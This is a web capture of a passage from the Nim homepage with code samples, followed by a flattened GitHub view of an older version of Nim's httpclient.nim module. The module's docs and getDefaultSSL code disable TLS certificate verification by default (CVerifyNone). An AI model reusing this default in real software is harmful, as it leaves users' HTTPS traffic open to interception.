  It is well-suited for embedded, hard-realtime systems.
* Modern concepts like zero-overhead iterators and compile-time evaluation
  of user-defined functions, in combination with the preference of value-based
  datatypes allocated on the stack, lead to extremely performant code.
* Support for various backends: it compiles to C, C++ or JavaScript so that Nim
  can be used for all backend and frontend needs.

### Expressive

* Nim is self-contained: the compiler and the standard library are implemented in Nim.
* Nim has a powerful macro system which allows direct manipulation of the AST,
  offering nearly unlimited opportunities.

### Elegant

* Macros cannot change Nim's syntax because there is no need for it â
  the syntax is flexible enough.
* Modern type system with local type inference, tuples, generics and sum types.
* Statements are grouped by indentation but can span multiple lines.

Simple example
Ifâ¦else, Case switch
Basic math
String operations
Comprehensions

````
import std/strformat

type
  Person = object
    name: string
    age: Natural # Ensures the age is positive

let people = [
  Person(name: "John", age: 45),
  Person(name: "Kate", age: 30)
]

for person in people:
  # Type-safe string interpolation,
  # evaluated at compile time.
  echo(fmt"{person.name} is {person.age} years old")

# Thanks to Nim's 'iterator' and 'yield' constructs,
# iterators are as easy to write as ordinary
# functions. They are compiled to inline loops.
iterator oddNumbers[Idx, T](a: array[Idx, T]): T =
  for x in a:
    if x mod 2 == 1:
      yield x

for odd in oddNumbers([3, 6, 9, 12, 15, 18]):
  echo odd

# Use Nim's macro system to transform a dense
# data-centric description of x86 instructions
# into lookup tables that are used by
# assemblers and JITs.
import macros, strutils

macro toLookupTable(data: static[string]): untyped =
  result = newTree(nnkBracket)
  for w in data.split(';'):
    result.add newLit(w)

const
  data = "mov;btc;cli;xor"
  opcodes = toLookupTable(data)

for o in opcodes:
  echo o
````
````
var conditional = 42

if conditional < 0:
  echo "conditional < 0"
elif conditional > 0:
  echo "conditional > 0"
else:
  echo "conditional == 0"

var ternary = if conditional == 42: true else: false

var another =
  if conditional == 0:
    "zero"
  elif conditional mod 2 == 0:
    "even"
  else:
    "odd"

# Case switch.
var letter = 'c'

case letter
of 'a':
  echo "letter is 'a'"
of 'b', 'c':
  echo "letter is 'b' or 'c'"
of 'd'..'h':
  echo "letter is between 'd' and 'h'"
else:
  echo "letter is another character"
````
````
import std/math

# Basic math.
assert 1 + 2 == 3        # Sum
assert 4 - 1 == 3        # Subtraction
assert 2 * 2 == 4        # Multiplication
assert 4 / 2 == 2.0      # Division
assert 4 div 2 == 2      # Integer Division
assert 2 ^ 3 == 8        # Power
assert 4 mod 2 == 0      # Modulo
assert (2 xor 4) == 6    # XOR
assert (4 shr 2) == 1    # Shift Right
assert PI * 2 == TAU     # PI and TAU
assert sqrt(4.0) == 2.0  # Square Root
assert round(3.5) == 4.0 # Round
assert isPowerOfTwo(16)  # Powers of Two
assert floor(2.9) == 2.0 # Floor
assert ceil(2.9) == 3.0  # Ceil
assert cos(TAU) == 1.0   # Cosine
assert gcd(12, 8) == 4   # Greatest common divisor
assert trunc(1.75) == 1.0     # Truncate
assert floorMod(8, 3) == 2    # Floor Modulo
assert floorDiv(8, 3) == 2    # Floor Division
assert hypot(4.0, 3.0) == 5.0 # Hypotenuse
assert gamma(4.0) == 6.0      # Gamma function
assert radToDeg(TAU) == 360.0 # Radians to Degrees
assert clamp(1.4, 0.0 .. 1.0) == 1.0 # Clamp
assert almostEqual(PI, 3.14159265358979)
assert euclDiv(-13, -3) == 5  # Euclidean Division
assert euclMod(-13, 3) == 2   # Euclidean Modulo
````
````
import std/[strutils, strscans]

assert "con" & "cat" == "concat"
assert "    a    ".strip == "a"
assert "42".parseInt == 42
assert "3.14".parseFloat == 3.14
assert "0x666".parseHexInt == 1638
assert "TrUe".parseBool == true
assert "0o777".parseOctInt == 511
assert "a".repeat(9) == "aaaaaaaaa"
assert "abc".startsWith("ab")
assert "abc".endsWith("bc")
assert ["a", "b", "c"].join == "abc"
assert "abcd".find("c") == 2
assert "a x a y a z".count("a") == 3
assert "A__B__C".normalize == "abc"
assert "a,b".split(",") == @["a", "b"]
assert "a".center(5) == "  a  "
assert "a".indent(4) == "    a"
assert "    a".unindent(4) == "a"

for word in tokenize("This is an example"):
  echo word

let (ok, year, month, day) = scanTuple("1000-01-01", "$i-$i-$i")
if ok:
  assert year == 1000
  assert month == 1
  assert day == 1
````
````
import std/[sugar, tables, sets, sequtils, strutils]

let variable0 = collect(newSeq):
  for item in @[-9, 1, 42, 0, -1, 9]:
    item * 2

assert variable0 == @[-18, 2, 84, 0, -2, 18]

let variable1 = collect(initTable):
  for key, value in @[0, 5, 9]:
    {key: value div 2}

assert variable1 == {0: 0, 1: 2, 2: 4}.toTable

let variable2 = collect(initHashSet):
  for item in @[-9, 1, 42, 0, -1, 9]:
    {item + item}

assert variable2 == [2, 18, 84, 0, -18, -2].toHashSet

assert toSeq(1..15).mapIt(
    if it mod 15 == 0:  "FizzBuzz"
    elif it mod 5 == 0: "Buzz"
    elif it mod 3 == 0: "Fizz"
    else: $it
  ).join(" ").strip == "1 2 Fizz 4 Buzz Fizz 7 8 Fizz Buzz 11 Fizz 13 14 FizzBuzz"
````

[More examples at RosettaCodeâ¦](http://rosettacode.org/wiki/Category%3ANim)

# Recent articles

24 December 2024

## [Nim version 2.0.14 released](/blog/2024/12/24/nim-2014-released.html)

The Nim team is happy to announce Nim version 2.0.14, our seventh patch release for Nim 2.0,
for our users who havenât switched yet to [Nim 2.2](https://nim-lang.org/blog/2024/10/02/nim-220-2010.html).

09 December 2024

## [Launching the 2024 Nim Community Survey](/blog/2024/12/09/community-survey-2024.html)

We are proud to announce the launch of the official
[2024 Nim Community Survey](https://forms.gle/s6WomUFyUANijhrL6)!

[All articles](/blog.html)

![](/assets/img/mastering_nim.jpg)
# Mastering Nim

### The definite guide on Nim!

### Written by the inventor himself.

### Now with updated content for version 2.0 which solves the biggest pain point of Nim 1.0, shared memory in a multi-threaded setting.

[Buy it on amazon.com](https://www.amazon.com/dp/B0B4R7B9YX)
[Buy it on amazon.de](https://www.amazon.de/dp/B0B4R7B9YX)

# Support Nim

## Join the 100+ companies and individuals that support Nim

### The Nim project is developed globally by a group of volunteers. We welcome recurring donations, which enable us to spend more time working on Nim.

[Donate](/donate.html)

# Community

## Real-time chat

*#*Libera.chat#nim

[Discord/Nim](https://discord.gg/nim)

[Gitter/Nim](https://gitter.im/nim-lang/Nim)

[*m*#nim:envs.net](https://matrix.to/#/#nim:envs.net)

[*#*IRC Logs](https://irclogs.nim-lang.org)

[Telegram/nim\_lang](https://t.me/nim_lang)

## Forum

[forum.nim-lang.org](https://forum.nim-lang.org)

[r/nim](https://reddit.com/r/nim)

[StackOverflow](https://stackoverflow.com/questions/tagged/nim-lang)

## Bug reports

[nim-lang/Nim](https://github.com/nim-lang/Nim/issues)

## Twitter

[@nim\_lang](https://twitter.com/nim_lang)

[Join the community](/community.html)

# Looking for the GitHub repository?

### The Nim compiler and tools are all written in Nim and licensed under the MIT license, with most development taking place on GitHub. Be sure to watch the repository to get updates on Nim's development, or star it to give us some brownie points.

[Source code](https://github.com/nim-lang/Nim)

Unless otherwise stated, the content of this page is
licensed under the
[Creative Commons Attribution 3.0](https://creativecommons.org/licenses/by/3.0/)
license.
Code displayed on this website is MIT licensed.

This website is available on
[GitHub](https://github.com/nim-lang/website)
and contributions are welcome.
Original website design by
[Dominik Picheta](https://github.com/dom96) and
[Hugo Locurcio](https://github.com/Calinou).
Logo by [Joseph Wecker](https://github.com/josephwecker).

[![](/assets/img/do.png)](https://m.do.co/c/637ab907c7f4)



=== Content from github.com_eccbb79c_20250119_123120.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2FNim%2Fblob%2Fdc5a40f3f39c6ea672e6dc6aca7f8118a69dda99%2Flib%2Fpure%2Fhttpclient.nim)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2FNim%2Fblob%2Fdc5a40f3f39c6ea672e6dc6aca7f8118a69dda99%2Flib%2Fpure%2Fhttpclient.nim)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nim-lang%2FNim)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nim-lang](/nim-lang)
/
**[Nim](/nim-lang/Nim)**
Public

* [Notifications](/login?return_to=%2Fnim-lang%2FNim) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fnim-lang%2FNim)
* [Star
   16.8k](/login?return_to=%2Fnim-lang%2FNim)

* [Code](/nim-lang/Nim)
* [Issues
  2k](/nim-lang/Nim/issues)
* [Pull requests
  86](/nim-lang/Nim/pulls)
* [Actions](/nim-lang/Nim/actions)
* [Projects
  2](/nim-lang/Nim/projects)
* [Wiki](/nim-lang/Nim/wiki)
* [Security](/nim-lang/Nim/security)
* [Insights](/nim-lang/Nim/pulse)

Additional navigation options

* [Code](/nim-lang/Nim)
* [Issues](/nim-lang/Nim/issues)
* [Pull requests](/nim-lang/Nim/pulls)
* [Actions](/nim-lang/Nim/actions)
* [Projects](/nim-lang/Nim/projects)
* [Wiki](/nim-lang/Nim/wiki)
* [Security](/nim-lang/Nim/security)
* [Insights](/nim-lang/Nim/pulse)

## Files

 dc5a40f
## Breadcrumbs

1. [Nim](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99)
2. /[lib](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib)
3. /[pure](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure)
/
# httpclient.nim

Copy path Blame  Blame
## Latest commit

## History

[History](/nim-lang/Nim/commits/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure/httpclient.nim)1190 lines (1059 loc) · 42.1 KB dc5a40f
## Breadcrumbs

1. [Nim](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99)
2. /[lib](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib)
3. /[pure](/nim-lang/Nim/tree/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure)
/
# httpclient.nim

Top
## File metadata and controls

* Code
* Blame

1190 lines (1059 loc) · 42.1 KB[Raw](https://github.com/nim-lang/Nim/raw/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure/httpclient.nim)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000### Nim's Runtime Library# (c) Copyright 2019 Nim Contributors## See the file "copying.txt", included in this# distribution, for details about the copyright.#
## This module implements a simple HTTP client that can be used to retrieve## webpages and other data.#### Retrieving a website## ====================#### This example uses HTTP GET to retrieve## ``http://google.com``:#### .. code-block:: Nim## import httpClient## var client = newHttpClient()## echo client.getContent("http://google.com")#### The same action can also be performed asynchronously, simply use the## ``AsyncHttpClient``:#### .. code-block:: Nim## import asyncdispatch, httpclient#### proc asyncProc(): Future[string] {.async.} =## var client = newAsyncHttpClient()## return await client.getContent("http://example.com")#### echo waitFor asyncProc()#### The functionality implemented by ``HttpClient`` and ``AsyncHttpClient``## is the same, so you can use whichever one suits you best in the examples## shown here.#### \*\*Note:\*\* You need to run asynchronous examples in an async proc## otherwise you will get an ``Undeclared identifier: 'await'`` error.#### Using HTTP POST## ===============#### This example demonstrates the usage of the W3 HTML Validator, it## uses ``multipart/form-data`` as the ``Content-Type`` to send the HTML to be## validated to the server.#### .. code-block:: Nim## var client = newHttpClient()## var data = newMultipartData()## data["output"] = "soap12"## data["uploaded\_file"] = ("test.html", "text/html",## "<html><head></head><body><p>test</p></body></html>")#### echo client.postContent("http://validator.w3.org/check", multipart=data)#### To stream files from disk when performing the request, use ``addFiles``.#### \*\*Note:\*\* This will allocate a new ``Mimetypes`` database every time you call## it, you can pass your own via the ``mimeDb`` parameter to avoid this.#### .. code-block:: Nim## let mimes = newMimetypes()## var client = newHttpClient()## var data = newMultipartData()## data.addFiles({"uploaded\_file": "test.html"}, mimeDb = mimes)#### echo client.postContent("http://validator.w3.org/check", multipart=data)#### You can also make post requests with custom headers.## This example sets ``Content-Type`` to ``application/json``## and uses a json object for the body#### .. code-block:: Nim## import httpclient, json#### let client = newHttpClient()## client.headers = newHttpHeaders({ "Content-Type": "application/json" })## let body = %\*{## "data": "some text"## }## let response = client.request("http://some.api", httpMethod = HttpPost, body = $body)## echo response.status#### Progress reporting## ==================#### You may specify a callback procedure to be called during an HTTP request.## This callback will be executed every second with information about the## progress of the HTTP request.#### .. code-block:: Nim## import asyncdispatch, httpclient#### proc onProgressChanged(total, progress, speed: BiggestInt) {.async.} =## echo("Downloaded ", progress, " of ", total)## echo("Current rate: ", speed div 1000, "kb/s")#### proc asyncProc() {.async.} =## var client = newAsyncHttpClient()## client.onProgressChanged = onProgressChanged## discard await client.getContent("http://speedtest-ams2.digitalocean.com/100mb.test")#### waitFor asyncProc()#### If you would like to remove the callback simply set it to ``nil``.#### .. code-block:: Nim## client.onProgressChanged = nil#### \*\*Warning:\*\* The ``total`` reported by httpclient may be 0 in some cases.###### SSL/TLS support## ===============## This requires the OpenSSL library, fortunately it's widely used and installed## on many operating systems. httpclient will use SSL automatically if you give## any of the functions a url with the ``https`` schema, for example:## ``https://github.com/``.#### You will also have to compile with ``ssl`` defined like so:## ``nim c -d:ssl ...``.#### Certificate validation is NOT performed by default.## This will change in future.#### A set of directories and files from the `ssl\_certs <ssl\_certs.html>`\_## module are scanned to locate CA certificates.#### See `newContext <net.html#newContext>`\_ to tweak or disable certificate validation.#### Timeouts## ========#### Currently only the synchronous functions support a timeout.## The timeout is## measured in milliseconds, once it is set any call on a socket which may## block will be susceptible to this timeout.#### It may be surprising but the## function as a whole can take longer than the specified timeout, only## individual internal calls on the socket are affected. In practice this means## that as long as the server is sending data an exception will not be raised,## if however data does not reach the client within the specified timeout a## ``TimeoutError`` exception will be raised.#### Here is how to set a timeout when creating an ``HttpClient`` instance:#### .. code-block:: Nim## import httpclient#### let client = newHttpClient(timeout = 42)#### Proxy## =====#### A proxy can be specified as a param to any of the procedures defined in## this module. To do this, use the ``newProxy`` constructor. Unfortunately,## only basic authentication is supported at the moment.#### Some examples on how to configure a Proxy for ``HttpClient``:#### .. code-block:: Nim## import httpclient#### let myProxy = newProxy("http://myproxy.network")## let client = newHttpClient(proxy = myProxy)#### Get Proxy URL from environment variables:#### .. code-block:: Nim## import httpclient#### var url = ""## try:## if existsEnv("http\_proxy"):## url = getEnv("http\_proxy")## elif existsEnv("https\_proxy"):## url = getEnv("https\_proxy")## except ValueError:## echo "Unable to parse proxy from environment variables."#### let myProxy = newProxy(url = url)## let client = newHttpClient(proxy = myProxy)#### Redirects## =========#### The maximum redirects can be set with the ``maxRedirects`` of ``int`` type,## it specifies the maximum amount of redirects to follow,## it defaults to ``5``, you can set it to ``0`` to disable redirects.#### Here you can see an example about how to set the ``maxRedirects`` of ``HttpClient``:#### .. code-block:: Nim## import httpclient#### let client = newHttpClient(maxRedirects = 0)##
import std/private/since
import net, strutils, uri, parseutils, base64, os, mimetypes, streams, math, random, httpcore, times, tables, streams, std/monotimesimport asyncnet, asyncdispatch, asyncfileimport nativesockets
export httpcore except parseHeader # TODO: The ``except`` doesn't work
type Response\* = ref object version\*: string status\*: string headers\*: HttpHeaders body: string bodyStream\*: Stream
 AsyncResponse\* = ref object version\*: string status\*: string headers\*: HttpHeaders body: string bodyStream\*: FutureStream[string]
proc code\*(response: Response | AsyncResponse): HttpCode {.raises: [ValueError, OverflowDefect].} = ## Retrieves the specified response's ``HttpCode``. ## ## Raises a ``ValueError`` if the response's ``status`` does not have a ## corresponding ``HttpCode``. return response.status[0 .. 2].parseInt.HttpCode
proc contentType\*(response: Response | AsyncResponse): string = ## Retrieves the specified response's content type. ## ## This is effectively the value of the "Content-Type" header. response.headers.getOrDefault("content-type")
proc contentLength\*(response: Response | AsyncResponse): int = ## Retrieves the specified response's content length. ## ## This is effectively the value of the "Content-Length" header. ## ## A ``ValueError`` exception will be raised if the value is not an integer. var contentLengthHeader = response.headers.getOrDefault("Content-Length") return contentLengthHeader.parseInt()
proc lastModified\*(response: Response | AsyncResponse): DateTime = ## Retrieves the specified response's last modified time. ## ## This is effectively the value of the "Last-Modified" header. ## ## Raises a ``ValueError`` if the parsing fails or the value is not a correctly ## formatted time. var lastModifiedHeader = response.headers.getOrDefault("last-modified") result = parse(lastModifiedHeader, "ddd, dd MMM yyyy HH:mm:ss 'GMT'", utc())
proc body\*(response: Response): string = ## Retrieves the specified response's body. ## ## The response's body stream is read synchronously. if response.body.len == 0: response.body = response.bodyStream.readAll() return response.body
proc body\*(response: AsyncResponse): Future[string] {.async.} = ## Reads the response's body and caches it. The read is performed only ## once. if response.body.len == 0: response.body = await readAll(response.bodyStream) return response.body
type Proxy\* = ref object url\*: Uri auth\*: string
 MultipartEntry = object name, content: string case isFile: bool of true: filename, contentType: string fileSize: int64 isStream: bool else: discard
 MultipartEntries\* = openArray[tuple[name, content: string]] MultipartData\* = ref object content: seq[MultipartEntry]
 ProtocolError\* = object of IOError ## exception that is raised when server ## does not conform to the implemented ## protocol
 HttpRequestError\* = object of IOError ## Thrown in the ``getContent`` proc ## and ``postContent`` proc, ## when the server returns an error
const defUserAgent\* = "Nim httpclient/" & NimVersion
proc httpError(msg: string) = var e: ref ProtocolError new(e) e.msg = msg raise e
proc fileError(msg: string) = var e: ref IOError new(e) e.msg = msg raise e
when not defined(ssl): type SslContext = ref objectvar defaultSslContext {.threadvar.}: SslContext
proc getDefaultSSL(): SslContext = result = defaultSslContext when defined(ssl): if result == nil: defaultSslContext = newContext(verifyMode = CVerifyNone) result = defaultSslContext doAssert result != nil, "failure to initialize the SSL context"
proc newProxy\*(url: string, auth = ""): Proxy = ## Constructs a new ``TProxy`` object. result = Proxy(url: parseUri(url), auth: auth)
proc newMultipartData\*: MultipartData = ## Constructs a new ``MultipartData`` object. MultipartData()
proc `$`\*(data: MultipartData): string {.since: (1, 1).} = ## convert MultipartData to string so it's human readable when echo ## see https://github.com/nim-lang/Nim/issues/11863 const sep = "-".repeat(30) for pos, entry in data.content: result.add(sep & center($pos, 3) & sep) result.add("\nname=\"" & entry.name & "\"") if entry.isFile: result.add("; filename=\"" & entry.filename & "\"\n") result.add("Content-Type: " & entry.contentType) result.add("\n\n" & entry.content & "\n")
proc add\*(p: MultipartData, name, content: string, filename: string = "", contentType: string = "", useStream = true) = ## Add a value to the multipart data. ## ## When ``useStream`` is ``false``, the file will be read into memory. ## ## Raises a ``ValueError`` exception if ## ``name``, ``filename`` or ``contentType`` contain newline characters. if {'\c', '\L'} in name: raise newException(ValueError, "name contains a newline character") if {'\c', '\L'} in filename: raise newException(ValueError, "filename contains a newline character") if {'\c', '\L'} in contentType: raise newException(ValueError, "contentType contains a newline character")
 var entry = MultipartEntry( name: name, content: content, isFile: filename.len > 0 )
 if entry.isFile: entry.isStream = useStream entry.filename = filename entry.contentType = contentType
 p.content.add(entry)
proc add\*(p: MultipartData, xs: MultipartEntries): MultipartData {.discardable.} = ## Add a list of multipart entries to the multipart data ``p``. All values are ## added without a filename and without a content type. ## ## .. code-block:: Nim ## data.add({"action": "login", "format": "json"}) for name, content in xs.items: p.add(name, content) result = p
proc newMultipartData\*(xs: MultipartEntries): MultipartData = ## Create a new multipart data object and fill it with the entries ``xs`` ## directly. ## ## .. code-block:: Nim ## var data = newMultipartData({"action": "login", "format": "json"}) result = MultipartData() for entry in xs: result.add(entry.name, entry.content)
proc addFiles\*(p: MultipartData, xs: openArray[tuple[name, file: string]], mimeDb = newMimetypes(), useStream = true): MultipartData {.discardable.} = ## Add files to a multipart data object. The files will be streamed from disk ## when the request is being made. When ``stream`` is ``false``, the files are ## instead read into memory, but beware this is very memory ineffecient even ## for small files. The MIME types will automatically be determined. ## Raises an ``IOError`` if the file cannot be opened or reading fails. To ## manually specify file content, filename and MIME type, use ``[]=`` instead. ## ## .. code-block:: Nim ## data.addFiles({"uploaded\_file": "public/test.html"}) for name, file in xs.items: var contentType: string let (\_, fName, ext) = splitFile(file) if ext.len > 0: contentType = mimeDb.getMimetype(ext[1..ext.high], "") let content = if useStream: file else: readFile(file).string p.add(name, content, fName & ext, contentType, useStream = useStream) result = p
proc `[]=`\*(p: MultipartData, name, content: string) = ## Add a multipart entry to the multipart data ``p``. The value is added ## without a filename and without a content type. ## ## .. code-block:: Nim ## data["username"] = "NimUser" p.add(name, content)
proc `[]=`\*(p: MultipartData, name: string, file: tuple[name, contentType, content: string]) = ## Add a file to the multipart data ``p``, specifying filename, contentType ## and content manually. ## ## .. code-block:: Nim ## data["uploaded\_file"] = ("test.html", "text/html", ## "<html><head></head><body><p>test</p></body></html>") p.add(name, file.content, file.name, file.contentType, useStream = false)
proc getBoundary(p: MultipartData): string = if p == nil or p.content.len == 0: return while true: result = $rand(int.high) for i, entry in p.content: if result in entry.content: break elif i == p.content.high: return
proc sendFile(socket: Socket | AsyncSocket, entry: MultipartEntry) {.multisync.} = const chunkSize = 2^18 let file = when socket is AsyncSocket: openAsync(entry.content) else: newFileStream(entry.content, fmRead)
 var buffer: string while true: buffer = when socket is AsyncSocket: (await read(file, chunkSize)).string else: readStr(file, chunkSize).string if buffer.len == 0: break await socket.send(buffer) file.close()
proc redirection(status: string): bool = const redirectionNRs = ["301", "302", "303", "307", "308"] for i in items(redirectionNRs): if status.startsWith(i): return true
proc getNewLocation(lastURL: string, headers: HttpHeaders): string = result = headers.getOrDefault"Location" if result == "": httpError("location header expected") # Relative URLs. (Not part of the spec, but soon will be.) let r = parseUri(result) if r.hostname == "" and r.path != "": var parsed = parseUri(lastURL) parsed.path = r.path parsed.query = r.query parsed.anchor = r.anchor result = $parsed
proc generateHeaders(requestUrl: Uri, httpMethod: string, headers: HttpHeaders, proxy: Proxy): string = # GET let upperMethod = httpMethod.toUpperAscii() result = upperMethod result.add ' '
 if proxy.isNil or requestUrl.scheme == "https": # /path?query if not requestUrl.path.startsWith("/"): result.add '/' result.add(requestUrl.path) if requestUrl.query.len > 0: result.add("?" & requestUrl.query) else: # Remove the 'http://' from the URL for CONNECT requests for TLS connections. var modifiedUrl = requestUrl if requestUrl.scheme == "https": modifiedUrl.scheme = "" result.add($modifiedUrl)
 # HTTP/1.1\c\l result.add(" HTTP/1.1" & httpNewLine)
 # Host header. if not headers.hasKey("Host"): if requestUrl.port == "": add(result, "Host: " & requestUrl.hostname & httpNewLine) else: add(result, "Host: " & requestUrl.hostname & ":" & requestUrl.port & httpNewLine)
 # Connection header. if not headers.hasKey("Connection"): add(result, "Connection: Keep-Alive" & httpNewLine)
 # Proxy auth header. if not proxy.isNil and proxy.auth != "": let auth = base64.encode(proxy.auth) add(result, "Proxy-Authorization: basic " & auth & httpNewLine)
 for key, val in headers: add(result, key & ": " & val & httpNewLine)
 add(result, httpNewLine)
type ProgressChangedProc\*[ReturnType] = proc (total, progress, speed: BiggestInt): ReturnType {.closure, gcsafe.}
 HttpClientBase\*[SocketType] = ref object socket: SocketType connected: bool currentURL: Uri ## Where we are currently connected. headers\*: HttpHeaders ## Headers to send in requests. maxRedirects: Natural ## Maximum redirects, set to ``0`` to disable. userAgent: string timeout\*: int ## Only used for blocking HttpClient for now. proxy: Proxy ## ``nil`` or the callback to call when request progress changes. when SocketType is Socket: onProgressChanged\*: ProgressChangedProc[void] else: onProgressChanged\*: ProgressChangedProc[Future[void]] when defined(ssl): sslContext: net.SslContext contentTotal: BiggestInt contentProgress: BiggestInt oneSecondProgress: BiggestInt lastProgressReport: MonoTime when SocketType is AsyncSocket: bodyStream: FutureStream[string] parseBodyFut: Future[void] else: bodyStream: Stream getBody: bool ## When `false`, the body is never read in requestAux.
type HttpClient\* = HttpClientBase[Socket]
proc newHttpClient\*(userAgent = defUserAgent, maxRedirects = 5, sslContext = getDefaultSSL(), proxy: Proxy = nil, timeout = -1, headers = newHttpHeaders()): HttpClient = ## Creates a new HttpClient instance. ## ## ``userAgent`` specifies the user agent that will be used when making ## requests. ## ## ``maxRedirects`` specifies the maximum amount of redirects to follow, ## default is 5. ## ## ``sslContext`` specifies the SSL context to use for HTTPS requests. ## See `SSL/TLS support <##ssl-tls-support>`\_ ## ## ``proxy`` specifies an HTTP proxy to use for this HTTP client's ## connections. ## ## ``timeout`` specifies the number of milliseconds to allow before a ## ``TimeoutError`` is raised. ## ## ``headers`` specifies the HTTP Headers. runnableExamples: import asyncdispatch, httpclient, strutils
 proc asyncProc(): Future[string] {.async.} = var client = newAsyncHttpClient() return await client.getContent("http://example.com")
 let exampleHtml = waitFor asyncProc() assert "Example Domain" in exampleHtml assert not ("Pizza" in exampleHtml)
 new result result.headers = headers result.userAgent = userAgent result.maxRedirects = maxRedirects result.proxy = proxy result.timeout = timeout result.onProgressChanged = nil result.bodyStream = newStringStream() result.getBody = true when defined(ssl): result.sslContext = sslContext
type AsyncHttpClient\* = HttpClientBase[AsyncSocket]
